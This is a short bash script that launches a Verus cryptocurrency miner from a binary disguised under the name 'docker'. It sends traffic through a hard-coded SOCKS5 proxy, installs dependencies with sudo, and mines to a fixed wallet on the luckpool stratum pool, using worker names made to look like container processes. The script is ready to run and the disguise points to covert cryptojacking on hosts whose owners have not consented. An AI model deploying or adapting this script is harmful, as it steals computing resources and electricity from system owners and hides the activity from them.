#!/bin/bash
export http_proxy="socks5://163.172.214.196:8080"
curl ifconfig.me
sudo apt install screen libjansson4 -y 
chmod +x docker 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
./docker -a verus -o $POOL -u $WALLET.$WORKER -p x -t 2
